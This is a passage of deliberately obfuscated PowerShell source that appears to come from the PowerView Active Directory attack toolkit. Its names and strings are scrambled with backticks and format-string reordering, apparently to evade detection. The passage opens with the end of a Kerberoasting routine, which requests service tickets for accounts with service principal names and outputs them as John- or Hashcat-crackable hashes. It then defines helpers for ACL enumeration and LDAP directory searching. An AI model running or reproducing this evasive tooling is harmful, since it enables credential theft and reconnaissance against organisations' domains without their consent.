        [Alias({"{0}{1}"-f 'Filt','er'})]
        [String]
        ${l`daP`F`ILter},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'h','A','DSPat'})]
        [String]
        ${s`eARchba`se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}{3}{4}" -f 'nC','ontr','Domai','olle','r'})]
        [String]
        ${s`erv`eR},

        [ValidateSet({"{0}{1}" -f'Bas','e'}, {"{1}{0}{2}"-f'neLev','O','el'}, {"{1}{2}{0}" -f'tree','Su','b'})]
        [String]
        ${s`EaRCh`SCo`pe} = ("{1}{0}" -f 'tree','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${resuLt`paG`Esi`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`eRvertImE`lI`M`It},

        [Switch]
        ${ToM`BSt`oNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REd`EnTIAL} =  (  gET-variAbLe  0DSqR ).valUe::"e`mPtY",

        [ValidateSet({"{0}{1}"-f'J','ohn'}, {"{0}{2}{1}" -f 'Ha','t','shca'})]
        [Alias({"{0}{1}" -f 'Form','at'})]
        [String]
        ${oU`TPu`TfOrmAT} = ("{1}{0}"-f'ohn','J')
    )

    BEGIN {
        ${U`sE`RsE`ArChER`Ar`GUmEnTs} = @{
            'SPN' = ${tR`Ue}
            ("{0}{1}{2}"-f 'Pro','pertie','s') = ("{4}{6}{5}{8}{1}{7}{0}{2}{3}{9}"-f 'dname,servic','i','ep','rincipaln','samaccount','ng','name,disti','she','u','ame')
        }
        if (${P`sBOU`Nd`paRAm`etERs}[("{1}{0}" -f'n','Domai')]) { ${uSerse`AR`chErA`RgU`mENTs}[("{2}{0}{1}"-f 'omai','n','D')] = ${D`oMAin} }
        if (${P`s`BoU`N`dP`ArAmETeRs}[("{1}{0}{2}" -f'te','LDAPFil','r')]) { ${u`seR`SEARcHe`R`ARg`Umen`TS}[("{2}{0}{1}" -f 'lt','er','LDAPFi')] = ${lda`PF`IlTeR} }
        if (${PSBoUN`dPa`RaM`ET`E`RS}[("{2}{1}{0}" -f 'rchBase','a','Se')]) { ${uSerS`eaR`C`HE`RArgUme`NtS}[("{1}{2}{0}{3}" -f'hBa','Sear','c','se')] = ${sEa`R`CH`Base} }
        if (${PsBouND`par`A`mE`TerS}[("{1}{0}"-f'erver','S')]) { ${usERsEARC`Her`Ar`g`U`mEnTS}[("{0}{2}{1}"-f 'Se','ver','r')] = ${s`erVEr} }
        if (${PSbOu`N`dP`ARAmE`TerS}[("{0}{1}{2}"-f'SearchS','co','pe')]) { ${USErseARc`He`RA`Rg`UmENts}[("{2}{1}{0}" -f'pe','Sco','Search')] = ${seARc`hS`cO`pE} }
        if (${pS`B`ouND`pAr`Am`ETErS}[("{3}{2}{1}{0}"-f 'ize','sultPageS','e','R')]) { ${USER`SEA`RchErARGu`M`EntS}[("{0}{1}{3}{2}"-f'Res','ultPa','Size','ge')] = ${RES`UL`TPAG`eS`iZE} }
        if (${PSbOUnDpA`R`AM`etErs}[("{2}{1}{0}{3}"-f'L','erTime','Serv','imit')]) { ${USeRSeArChe`RaR`gUm`enTs}[("{2}{1}{3}{0}" -f 'imit','ime','ServerT','L')] = ${SERve`R`T`IM`ELiMiT} }
        if (${PS`BO`U`NdpA`RaMeTErS}[("{0}{1}"-f'Tombsto','ne')]) { ${uS`eRsEarchEra`R`G`UmENts}[("{1}{0}{2}"-f 'o','Tombst','ne')] = ${t`om`BstonE} }
        if (${PSbo`UN`dpARaMe`TErS}[("{2}{0}{3}{1}"-f'reden','ial','C','t')]) { ${UsErSe`A`RcH`Er`ArgUmENts}[("{2}{1}{0}" -f'l','ntia','Crede')] = ${cREDEn`T`IAl} }

        if (${Ps`BO`UNDPARaME`T`ers}[("{2}{0}{1}" -f'den','tial','Cre')]) {
            ${LogoNt`O`kEN} = &("{6}{5}{4}{0}{1}{2}{3}" -f'p','ersona','ti','on','UserIm','-','Invoke') -Credential ${crEDE`NTI`Al}
        }
    }

    PROCESS {
        if (${ps`B`OU`NDPAr`AmETE`RS}[("{1}{0}{2}" -f't','Iden','ity')]) { ${usErSe`ArChE`R`A`RGU`mENTS}[("{1}{0}{2}" -f 'en','Id','tity')] = ${i`dentI`TY} }
        &("{0}{1}{2}" -f 'Get-','DomainU','ser') @UserSearcherArguments | &("{2}{0}{1}{3}" -f'ere-Ob','jec','Wh','t') {${_}."SA`mAcc`oUnTn`A`me" -ne ("{1}{0}"-f 'tgt','krb')} | &("{4}{2}{3}{0}{1}" -f 'ainSP','NTicket','-D','om','Get') -OutputFormat ${ouT`P`UT`For`mat}
    }

    END {
        if (${lo`GOntO`kEn}) {
            &("{3}{1}{0}{4}{2}{5}"-f'e','v','tToSel','Invoke-Re','r','f') -TokenHandle ${loGo`N`ToKEN}
        }
    }
}


function g`et-`PATh`ACl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{0}{1}"-f 'ro','cess','PSSh','ouldP'}, '')]
    [OutputType({"{2}{0}{1}{4}{3}" -f 'owerView.Fil','e','P','CL','A'})]
    [CmdletBinding()]
    Param(
        [Parameter(manDaTOry = ${TR`UE}, vALUEFRompiPELinE = ${Tr`UE}, vALuEFrOMPIPeLinebyPrOPErtyNAmE = ${t`RUe})]
        [Alias({"{1}{0}" -f'e','FullNam'})]
        [String[]]
        ${P`ATh},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`E`DenTIal} =   $0dSQr::"e`mpTY"
    )

    BEGIN {

        function C`o`NveRt-F`IlERight {
            
            [CmdletBinding()]
            Param(
                [Int]
                ${F`sR}
            )

            ${accE`S`smAsk} = @{
                [uint32]("{0}{1}{3}{2}" -f '0x','80','00','0000') = ("{0}{1}{2}"-f 'Gene','ricRe','ad')
                [uint32]("{2}{1}{0}"-f'0','00','0x40000') = ("{2}{3}{1}{0}" -f 'e','Writ','Gene','ric')
                [uint32]("{1}{0}{2}"-f '000','0x200','00') = ("{0}{2}{3}{1}" -f'GenericE','te','xe','cu')
                [uint32]("{0}{1}{2}" -f'0','x10','000000') = ("{0}{1}{2}"-f 'Gener','icAl','l')
                [uint32]("{0}{2}{1}"-f '0x0','00000','20') = ("{2}{3}{1}{0}" -f'd','owe','Maxi','mumAll')
                [uint32]("{0}{1}{2}" -f '0x01','0000','00') = ("{0}{1}{3}{2}" -f 'A','ccess','ty','SystemSecuri')
                [uint32]("{1}{0}{2}{3}"-f'010','0x0','00','00') = ("{0}{1}{2}{3}" -f'Sy','nch','roni','ze')
                [uint32]("{1}{2}{0}"-f '000','0x0','0080') = ("{1}{0}{2}"-f'r','W','iteOwner')
                [uint32]("{1}{0}{2}{3}"-f '00','0x','0','40000') = ("{2}{1}{0}" -f 'teDAC','i','Wr')
                [uint32]("{2}{0}{1}{3}" -f '0','02000','0x0','0') = ("{0}{2}{3}{1}"-f 'Read','l','C','ontro')
                [uint32]("{1}{0}{2}"-f'10','0x000','000') = ("{0}{2}{1}"-f'D','te','ele')
                [uint32]("{1}{0}{2}"-f '00001','0x0','00') = ("{1}{4}{3}{0}{2}"-f 'ibut','W','es','ttr','riteA')
                [uint32]("{3}{1}{2}{0}" -f '080','0','0000','0x') = ("{3}{1}{0}{2}"-f 'ib','r','utes','ReadAtt')
                [uint32]("{0}{2}{1}"-f '0x','00040','000') = ("{3}{2}{1}{0}" -f'd','l','eleteChi','D')
                [uint32]("{1}{2}{0}{3}"-f '00000','0','x0','20') = ("{3}{1}{0}{2}"-f 'Trav','e/','erse','Execut')
                [uint32]("{0}{1}{2}" -f'0x0000','00','10') = ("{5}{0}{1}{4}{3}{2}" -f 'e','dAttr','es','t','ibu','WriteExtend')
                [uint32]("{2}{1}{0}" -f '0008','0000','0x') = ("{5}{3}{2}{1}{0}{4}"-f'te','ibu','tendedAttr','Ex','s','Read')
                [uint32]("{3}{2}{1}{0}" -f '004','0000','x0','0') = ("{2}{4}{0}{1}{5}{3}" -f'Ad','d','Append','irectory','Data/','Subd')
                [uint32]("{1}{0}{2}"-f '00','0x0','00002') = ("{3}{0}{2}{4}{1}"-f'te','ile','Da','Wri','ta/AddF')
                [uint32]("{2}{0}{1}" -f'000000','01','0x') = ("{4}{6}{2}{1}{3}{0}{5}" -f'ct','D','ist','ire','ReadD','ory','ata/L')
            }

            ${Si`m`PLEpeR`M`IsSI`ONS} = @{
                [uint32]("{1}{0}" -f'1ff','0x1f0') = ("{2}{1}{0}" -f 'ol','Contr','Full')
                [uint32]("{2}{0}{1}" -f '301b','f','0x0') = ("{0}{1}" -f'Mod','ify')
                [uint32]("{1}{0}{2}"-f 'x0200a','0','9') = ("{2}{3}{0}{1}"-f 'xecu','te','Re','adAndE')
                [uint32]("{2}{1}{0}" -f'019f','02','0x') = ("{0}{2}{1}{3}"-f'Re','Wr','adAnd','ite')
                [uint32]("{0}{1}"-f '0','x020089') = ("{1}{0}"-f 'ad','Re')
                [uint32]("{0}{2}{1}" -f'0x00','6','011') = ("{0}{1}"-f 'Writ','e')
            }

            ${PerMIsSi`o`NS} = @()

            
            ${per`MI`ssIO`NS} += ${sImpl`eP`E`RMIS`SiO`NS}."K`eYS" | &("{1}{0}{2}" -f'-Objec','ForEach','t') {
                              if ((${f`SR} -band ${_}) -eq ${_}) {
                                ${siMPlEP`ERMiSs`I`O`NS}[${_}]
                                ${F`Sr} = ${f`Sr} -band (-not ${_})
                              }
                            }

            
            ${PER`MIs`SI`OnS} += ${ACCE`SSM`A`sk}."K`eys" | &("{2}{3}{0}{1}"-f 'Obj','ect','Where','-') { ${F`sR} -band ${_} } | &("{1}{3}{2}{0}{4}"-f 'e','For','ach-Obj','E','ct') { ${aCc`EsSMa`sk}[${_}] }
            (${P`ERmiSSiO`NS} | &("{0}{1}{2}" -f'W','here','-Object') {${_}}) -join ','
        }

        ${Co`NVerT`A`RG`UMeNtS} = @{}
        if (${PsB`Oundp`A`RaMeT`eRs}[("{2}{1}{0}{3}"-f 'ia','dent','Cre','l')]) { ${Co`NVERtaRGu`M`en`TS}[("{2}{0}{1}" -f 'nt','ial','Crede')] = ${CRE`D`en`TIAl} }

        ${ma`PPedc`oM`PUTErS} = @{}
    }

    PROCESS {
        ForEach (${T`Ar`gEtPa`TH} in ${Pa`TH}) {
            try {
                if ((${ta`RG`ETP`ATH} -Match ((("{2}{0}{1}{3}" -f 'NOHNOHNO','H','H','NO.*HNOHNO.*'))  -rePlACe  ([ChAr]72+[ChAr]78+[ChAr]79),[ChAr]92)) -and (${psB`ou`NDParA`m`e`Ters}[("{2}{0}{1}"-f'red','ential','C')])) {
                    ${HoS`TCoMpUT`ER} = (&("{2}{0}{1}" -f'-Ob','ject','New') ("{1}{2}{0}"-f'm.Uri','S','yste')(${TArgE`TpA`TH}))."H`Ost"
                    if (-not ${M`ApPEd`CO`Mput`eRs}[${hO`StCo`mpU`TEr}]) {
                        
                        &("{3}{1}{0}{4}{2}{5}" -f '-R','dd','t','A','emoteConnec','ion') -ComputerName ${hostCo`mP`UteR} -Credential ${C`Re`DEn`TIAL}
                        ${MAP`p`EdCOmP`Ute`RS}[${ho`stcOm`pUteR}] = ${T`RUE}
                    }
                }

                ${A`Cl} = &("{2}{1}{0}" -f '-Acl','t','Ge') -Path ${t`A`Rgetpa`TH}

                ${A`cL}."gEta`CcES`S`RulES"(${tr`Ue}, ${Tr`UE}, [System.Security.Principal.SecurityIdentifier]) | &("{1}{4}{2}{3}{0}"-f'bject','F','c','h-O','orEa') {
                    ${S`ID} = ${_}."I`d`ENt`iT`yREf`erENcE"."vAL`UE"
                    ${n`AME} = &("{0}{1}{2}" -f 'Convert','F','rom-SID') -ObjectSID ${s`Id} @ConvertArguments

                    ${o`Ut} = &("{0}{2}{1}"-f'Ne','ect','w-Obj') ("{0}{2}{1}"-f 'P','Object','S')
                    ${O`Ut} | &("{0}{2}{1}" -f'Add-M','mber','e') ("{1}{0}{2}{3}" -f'ot','N','eproper','ty') ("{1}{0}" -f 'h','Pat') ${ta`Rg`eTP`AtH}
                    ${O`Ut} | &("{1}{2}{0}" -f 'mber','Ad','d-Me') ("{0}{2}{1}"-f 'Noteprop','y','ert') ("{4}{3}{1}{2}{0}" -f'mRights','leSy','ste','i','F') (&("{4}{3}{1}{0}{2}" -f'ile','-F','Right','rt','Conve') -FSR ${_}."fILE`s`ystE`Mrig`HTs"."v`AlUe__")
                    ${O`Ut} | &("{0}{1}{2}"-f 'A','dd-M','ember') ("{2}{0}{1}"-f'epr','operty','Not') ("{2}{3}{0}{1}{4}" -f'ityReferen','c','Iden','t','e') ${Na`mE}
                    ${o`UT} | &("{0}{3}{2}{1}" -f 'Ad','r','e','d-Memb') ("{0}{2}{1}"-f 'Not','ty','eproper') ("{0}{2}{1}" -f'Identity','D','SI') ${S`id}
                    ${O`Ut} | &("{0}{2}{1}{3}"-f'Add','m','-Me','ber') ("{3}{0}{2}{1}"-f 'o','perty','tepro','N') ("{3}{1}{0}{2}" -f'ontr','essC','olType','Acc') ${_}."ACC`ESsCO`NT`Ro`lTy`Pe"
                    ${o`Ut}."psO`BJe`CT"."typ`Ena`M`ES".("{1}{0}"-f 'nsert','I').Invoke(0, ("{2}{4}{0}{3}{1}" -f 'Fi','L','Power','leAC','View.'))
                    ${o`Ut}
                }
            }
            catch {
                &("{3}{0}{2}{4}{1}"-f'e','rbose','-','Writ','Ve') ('['+'Get-Pa'+'thAcl]'+' '+'err'+'o'+'r: '+"$_")
            }
        }
    }

    END {
        
        ${m`APPedC`oM`pUTErs}."kE`yS" | &("{2}{0}{1}{3}{4}" -f 've-','RemoteCon','Remo','nect','ion')
    }
}


function cON`Ve`RT-`ldAPp`Ro`PErTY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}"-f'PSS','dProcess','houl'}, '')]
    [OutputType({"{11}{7}{6}{4}{3}{8}{9}{10}{0}{2}{5}{1}" -f 'Custom','ect','Ob','to','u','j','.A','ment','matio','n.','PS','System.Manage'})]
    [CmdletBinding()]
    Param(
        [Parameter(MandAtORy = ${T`Rue}, vALUeFroMPIpelinE = ${tr`Ue})]
        [ValidateNotNullOrEmpty()]
        ${pRoPEr`T`ieS}
    )

    ${obj`EcTp`Rope`Rt`ieS} = @{}

    ${Pr`oPErT`iES}."pRoPerTY`N`A`meS" | &("{0}{1}{3}{2}" -f'ForE','ach-O','t','bjec') {
        if (${_} -ne ("{2}{1}{0}" -f'h','spat','ad')) {
            if ((${_} -eq ("{1}{2}{0}"-f 'd','objec','tsi')) -or (${_} -eq ("{1}{0}{2}" -f 'idh','s','istory'))) {
                
                ${OBJEC`T`p`RopErt`i`es}[${_}] = ${P`ROpErTI`Es}[${_}] | &("{1}{2}{0}" -f 'bject','ForEach-','O') { (&("{3}{2}{1}{0}" -f 'bject','O','-','New') ("{3}{5}{4}{7}{6}{0}{2}{1}"-f 'rincip','ifier','al.SecurityIdent','Syste','cu','m.Se','y.P','rit')(${_}, 0))."val`Ue" }
            }
            elseif (${_} -eq ("{1}{2}{0}" -f 'ype','gr','oupt')) {
                ${O`BJecTpro`pErtI`es}[${_}] = ${pR`O`PeRtI`ES}[${_}][0] -as ${GR`ouptyp`ee`Num}
            }
            elseif (${_} -eq ("{2}{0}{3}{1}" -f'a','counttype','s','mac')) {
                ${OBJ`eCTpR`oper`TiEs}[${_}] = ${pROP`e`R`TIes}[${_}][0] -as ${S`AMACCOU`NTTyp`ee`NuM}
            }
            elseif (${_} -eq ("{1}{2}{0}" -f'uid','object','g')) {
                
                ${ObjEct`p`RoPER`T`iEs}[${_}] = (&("{1}{0}{2}"-f 'c','New-Obje','t') ("{1}{0}" -f'uid','G') (,${P`RopeRTi`Es}[${_}][0]))."g`Uid"
            }
            elseif (${_} -eq ("{1}{2}{0}{3}"-f 'on','user','accountc','trol')) {
                ${OBJEctP`Ro`pe`R`T`IEs}[${_}] = ${Pr`Oper`TI`es}[${_}][0] -as ${U`Ac`ENum}
            }
            elseif (${_} -eq ("{1}{5}{0}{4}{3}{2}"-f'ri','nt','ptor','i','tydescr','secu')) {
                
                ${dE`scR`iPTOR} = &("{0}{1}{2}" -f 'New-','Obje','ct') ("{9}{7}{6}{5}{2}{4}{3}{0}{8}{1}"-f'yDesc','r','trol.Ra','rit','wSecu','on','rity.AccessC','cu','ripto','Se') -ArgumentList ${P`Ro`P`eRTies}[${_}][0], 0
                if (${d`escR`I`PTor}."Ow`NER") {
                    ${o`BJEc`TpRoP`E`RTi`Es}[("{0}{1}"-f'Own','er')] = ${DE`sCriPt`or}."o`Wner"
                }
                if (${DEs`cRI`p`TOr}."g`ROUp") {
                    ${OB`JEcTp`R`o`PE`RTiES}[("{0}{1}"-f 'Gr','oup')] = ${dE`sc`RiPtoR}."g`Roup"
                }
                if (${DE`s`c`RIpToR}."dI`scRe`TIoN`ArYA`cL") {
                    ${o`BJEct`prOpeR`T`IEs}[("{2}{1}{0}{3}{4}" -f'ryA','a','Discretion','c','l')] = ${descR`i`PtOR}."d`ISc`RetiONar`y`ACL"
                }
                if (${dE`SCr`Ip`Tor}."sY`STEMaCl") {
                    ${OBjEC`T`prOPERT`IEs}[("{1}{2}{0}" -f'Acl','Syste','m')] = ${dEs`CRi`Ptor}."s`YSTE`MacL"
                }
            }
            elseif (${_} -eq ("{2}{0}{1}{3}"-f 'cco','untexpire','a','s')) {
                if (${P`RO`pERTies}[${_}][0] -gt  ( geT-VArIAblE ("2"+"PfHU4") -VALUeOnlY  )::"MaXv`A`lUe"."T`iCks") {
                    ${obJe`ct`P`ROpeRties}[${_}] = ("{1}{0}" -f'ER','NEV')
                }
                else {
                    ${o`Bje`cTpROPE`RT`iES}[${_}] =  (gCI  VARiable:2PfhU4).VALuE::"FROMFI`Le`TiMe"(${p`RO`PeR`TieS}[${_}][0])
                }
            }
            elseif ( (${_} -eq ("{1}{0}{2}" -f 'go','lastlo','n')) -or (${_} -eq ("{3}{0}{2}{1}" -f'st','mestamp','logonti','la')) -or (${_} -eq ("{2}{1}{0}{3}"-f 'stse','la','pwd','t')) -or (${_} -eq ("{1}{2}{0}" -f 'ogoff','las','tl')) -or (${_} -eq ("{2}{3}{1}{0}" -f'e','dTim','badPassw','or')) ) {
                
                if (${PRoP`ert`I`es}[${_}][0] -is [System.MarshalByRefObject]) {
                    
                    ${t`Emp} = ${P`R`OpeRtIEs}[${_}][0]
                    [Int32]${hI`Gh} = ${TE`MP}.("{1}{0}"-f 'etType','G').Invoke().("{0}{1}{2}" -f 'Inv','ok','eMember').Invoke(("{0}{2}{1}"-f 'Hig','art','hP'),  (GET-item  ("V"+"arI"+"aBLE"+":VRT") ).vaLUE::"gEt`P`RoPEr`TY", ${nu`ll}, ${T`eMP}, ${N`Ull})
                    [Int32]${L`oW}  = ${TE`Mp}.("{2}{0}{1}" -f'T','ype','Get').Invoke().("{0}{1}{3}{2}" -f 'I','nvok','er','eMemb').Invoke(("{0}{1}"-f 'Lo','wPart'),    ( vAriABLE  ("vr"+"T") -Val )::"G`ETPrO`PErtY", ${n`Ull}, ${t`emp}, ${N`ULl})
                    ${OBJeCtPRoP`er`TI`eS}[${_}] = ( (vaRiaBlE  2PFhu4 -vaL)::"F`ROM`FIlETi`me"([Int64]("0x{0:x8}{1:x8}" -f ${HI`gh}, ${l`OW})))
                }
                else {
                    
                    ${Ob`jec`Tpr`O`pertIes}[${_}] = ( ( GeT-VAriABlE  2pfhu4 ).value::"FR`OMFIlE`TI`ME"((${p`Roper`Ties}[${_}][0])))
                }
            }
            elseif (${PR`Op`ERtIES}[${_}][0] -is [System.MarshalByRefObject]) {
                
                ${P`RoP} = ${propEr`Ti`Es}[${_}]
                try {
                    ${t`eMp} = ${p`ROP}[${_}][0]
                    [Int32]${H`IGh} = ${t`EMp}.("{2}{1}{0}" -f 'pe','etTy','G').Invoke().("{2}{0}{1}" -f 'o','keMember','Inv').Invoke(("{0}{1}{2}" -f'Hig','hPa','rt'),  ( variaBle ('VR'+'t')  -valUEO)::"GetPR`O`peRtY", ${nU`lL}, ${t`eMP}, ${n`ULl})
                    [Int32]${L`ow}  = ${Te`Mp}.("{0}{1}"-f'Ge','tType').Invoke().("{2}{1}{0}"-f 'mber','okeMe','Inv').Invoke(("{1}{2}{0}"-f'wPart','L','o'),   (  item  VARiAbLE:VrT ).vaLuE::"G`ETPR`opE`RTY", ${nU`ll}, ${te`mP}, ${N`ULL})
                    ${ob`je`CTPRo`PE`RtiES}[${_}] = [Int64]("0x{0:x8}{1:x8}" -f ${HI`gh}, ${l`OW})
                }
                catch {
                    &("{1}{2}{3}{0}"-f 'e','Wr','ite-Verbo','s') ('[Convert-'+'LD'+'A'+'P'+'Prop'+'er'+'ty] '+'err'+'o'+'r: '+"$_")
                    ${oB`J`eC`Tprop`e`RtiEs}[${_}] = ${pr`op}[${_}]
                }
            }
            elseif (${PRO`p`eRtIEs}[${_}]."Co`UnT" -eq 1) {
                ${obJ`ec`Tp`Rope`R`TiES}[${_}] = ${PR`opeR`Ties}[${_}][0]
            }
            else {
                ${o`BjeCtPRo`PeRti`Es}[${_}] = ${pRoper`Ti`es}[${_}]
            }
        }
    }
    try {
        &("{0}{1}{2}" -f 'New','-Obj','ect') -TypeName ("{0}{2}{1}"-f 'P','Object','S') -Property ${O`B`JEC`TPrOpertIES}
    }
    catch {
        &("{2}{0}{3}{1}" -f'a','g','Write-W','rnin') ('[Con'+'vert'+'-LDAPPr'+'operty'+'] '+'Err'+'or'+' '+'pa'+'r'+'sing '+'LDA'+'P '+'pr'+'operties'+' '+': '+"$_")
    }
}








function GEt`-d`OMAI`Nsea`RCHeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{4}{2}" -f 'Shou','P','Process','S','ld'}, '')]
    [OutputType({"{8}{1}{4}{11}{7}{5}{10}{0}{2}{9}{12}{6}{3}"-f 'ect','stem.Dir','or','er','ector','.D','h','es','Sy','ySe','ir','yServic','arc'})]
    [CmdletBinding()]
    Param(
        [Parameter(vAlUeFrOMpipElINE = ${t`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`o`mAIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f 'Filt','e','r'})]
        [String]
        ${lDAp`FI`l`Ter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pR`o`pertIEs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'DSPath','A'})]
        [String]
        ${S`EARChb`AsE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Sear`CHBaS`E`pR`ef`ix},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{0}{2}"-f'rolle','ont','r','DomainC'})]
        [String]
        ${se`RV`ER},

        [ValidateSet({"{1}{0}"-f'e','Bas'}, {"{0}{1}{2}" -f'O','neLev','el'}, {"{1}{0}" -f'e','Subtre'})]
        [String]
        ${SeArCh`sC`O`pE} = ("{1}{0}{2}"-f 'ubt','S','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`su`lTpageS`IzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRvErT`i`MEl`iMIT} = 120,

        [ValidateSet({"{1}{0}"-f 'cl','Da'}, {"{0}{1}"-f'Grou','p'}, {"{1}{0}"-f'ne','No'}, {"{0}{1}"-f 'O','wner'}, {"{0}{1}"-f'Sac','l'})]
        [String]
        ${sEc`U`RI`T`YMAsKS},

        [Switch]
        ${tOmBS`TO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`EdENTi`AL} =  (  GET-VariAbLe  ("0ds"+"Qr")).VALUE::"e`mptY"
    )

    PROCESS {
        if (${psbOUNd`Par`AmE`TE`RS}[("{0}{1}"-f 'Do','main')]) {
            ${TaR`gEtDo`M`Ain} = ${d`OM`AIN}

            if (${ENV`:`UsERDnS`dOma`IN} -and (${EnV:`U`S`eRdnsD`OMaIN}.("{1}{0}"-f 'im','Tr').Invoke() -ne '')) {
                
                ${u`SErd`om`AIn} = ${E`Nv:User`dnSdO`MAiN}
                if (${e`N`V`:LOGONSe`RVER} -and (${e`Nv:LogO`NSe`RVer}.("{0}{1}"-f 'T','rim').Invoke() -ne '') -and ${U`SeRd`oMaIN}) {
                    ${bind`SEr`VeR} = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif (${pSBO`UNd`p`ARAMET`eRS}[("{0}{3}{1}{2}"-f 'C','t','ial','reden')]) {
            
            ${D`oM`A`inOBjeCT} = &("{2}{1}{0}" -f'omain','-D','Get') -Credential ${cr`EdENti`Al}
            ${b`IND`sERver} = (${D`oM`AINOB`ject}."pdc`RoLEOW`N`er")."N`AmE"
            ${TAR`ge`TDo`M`Ain} = ${DO`mA`INO`BJE`CT}."NA`Me"
        }
        elseif (${eNV`:us`erD`Nsdom`A`In} -and (${E`NV:us`Erdnsdom`AIn}.("{1}{0}" -f 'rim','T').Invoke() -ne '')) {
            
            ${Ta`RgeTdoM`AIn} = ${En`V`:uSe`RD`NSD`OMaiN}
            if (${en`V:`LogO`N`SERVer} -and (${E`Nv:L`OG`Onse`Rver}.("{1}{0}"-f'im','Tr').Invoke() -ne '') -and ${TARge`TDo`mAiN}) {
                ${bINd`se`R`VeR} = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            
            &("{1}{2}{0}{3}"-f'rbo','write-','ve','se') ("{0}{1}{2}" -f 'g','et-d','omain')
            ${dOMAI`NOb`j`ecT} = &("{1}{3}{2}{0}" -f'n','Get-','i','Doma')
            ${B`INd`SeRVEr} = (${D`omA`ino`BjecT}."pdCroL`E`OwNEr")."N`AMe"
            ${T`A`RgEt`doMaIN} = ${dOma`INo`B`Je`CT}."N`AmE"
        }

        if (${P`SboU`NdPARa`mEtERs}[("{1}{0}"-f'r','Serve')]) {
            
            ${BInds`e`RvEr} = ${se`RV`ER}
        }

        ${SE`ARch`StRi`Ng} = ("{1}{0}"-f 'P://','LDA')

        if (${BIn`dS`eR`Ver} -and (${binDse`R`V`er}.("{1}{0}"-f'rim','T').Invoke() -ne '')) {
            ${search`sTri`Ng} += ${BIN`ds`eR`VEr}
            if (${TarG`E`TDOMAIN}) {
                ${Se`Ar`chst`RiNg} += '/'
            }
        }

        if (${p`sBou`NdPAr`AmETERs}[("{5}{1}{4}{2}{0}{3}" -f'fi','rc','asePre','x','hB','Sea')]) {
            ${Search`S`T`RIng} += ${sEARcHbA`s`e`Pr`E`FIX} + ','
        }

        if (${psb`OuNdPAr`Am`etErS}[("{2}{0}{1}"-f'Bas','e','Search')]) {
            if (${s`ea`RcHb`AsE} -Match ("{1}{0}"-f'/','^GC:/')) {
                
                ${dN} = ${s`Ear`cHB`ASe}.("{1}{2}{0}" -f 'pper','To','U').Invoke().("{1}{0}"-f 'rim','T').Invoke('/')
                ${sEaRCHST`Ri`NG} = ''
            }
            else {
                if (${S`eA`R`cHBASE} -match ("{1}{0}{2}"-f '/','^LDAP:','/')) {
                    if (${sEaRCH`BA`sE} -match ("{0}{1}{2}"-f 'LDAP:','//.+/.','+')) {
                        ${sEarC`HSt`RInG} = ''
                        ${dN} = ${s`eArc`Hbase}
                    }
                    else {
                        ${D`N} = ${S`earcHBA`SE}.("{0}{1}{2}" -f 'SubSt','rin','g').Invoke(7)
                    }
                }
                else {
                    ${d`N} = ${SeA`RCh`B`ASE}
                }
            }
        }
        else {
            
            if (${TA`RgetDOm`AIN} -and (${ta`R`Ge`Tdo`MaiN}.("{0}{1}" -f 'T','rim').Invoke() -ne '')) {
                ${D`N} = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        ${s`e`ARChstR`i`Ng} += ${dn}
        &("{0}{1}{2}" -f 'W','rit','e-Verbose') ('['+'Get-DomainS'+'ea'+'r'+'cher] '+'sea'+'r'+'ch '+'base'+': '+"$SearchString")

        if (${cREDe`NTI`Al} -ne   $0DsQr::"eM`pty") {
            &("{3}{1}{2}{0}{4}" -f'os','Ver','b','Write-','e') ("{13}{9}{5}{12}{7}{1}{16}{11}{2}{8}{18}{14}{10}{4}{15}{17}{0}{6}{3}" -f 'or L','cher','l','ection','denti','Dom','DAP conn','inSear','te','t-','e cre',' Using a','a','[Ge','at','a',']','ls f','rn')
            
            ${dOM`AInOBJe`CT} = &("{0}{2}{1}" -f 'New-Ob','ect','j') ("{4}{9}{0}{6}{7}{3}{5}{1}{2}{8}"-f'ector','E','ntr','vices.Di','D','rectory','ySe','r','y','ir')(${sea`Rch`s`TRiNG}, ${cRE`dEN`T`iaL}."Us`erna`me", ${c`REd`eNT`IaL}.("{5}{4}{1}{2}{0}{3}"-f'edent','rkC','r','ial','etwo','GetN').Invoke()."Pa`sSWO`Rd")
            ${s`EARCH`ER} = &("{2}{0}{1}" -f 'w-','Object','Ne') ("{8}{2}{7}{4}{5}{1}{3}{6}{0}"-f'archer','t','stem.','oryS','es.D','irec','e','DirectoryServic','Sy')(${DOMa`iN`O`Bj`ECt})
        }
        else {
            
            ${S`EArChER} = &("{2}{0}{1}"-f'e','w-Object','N') ("{5}{1}{3}{6}{2}{7}{10}{0}{4}{9}{8}"-f's.Dire','ys','ry','tem.Direct','cto','S','o','Servi','r','rySearche','ce')([ADSI]${seaR`cHSt`RInG})
        }

        ${S`E`ArCHEr}."Pa`GE`siZE" = ${rEsU`L`T`P`AGEsiZE}
        ${sear`C`hER}."SeARChSc`O`PE" = ${sEarCh`S`CoPe}
        ${Se`ARch`Er}."Ca`ch`EreSULtS" = ${f`A`lsE}
        ${s`EA`Rc`HEr}."re`FERRalcH`AS`i`Ng" =   (  CHildITEm vARIaBle:LivaPZ ).VaLue::"a`LL"
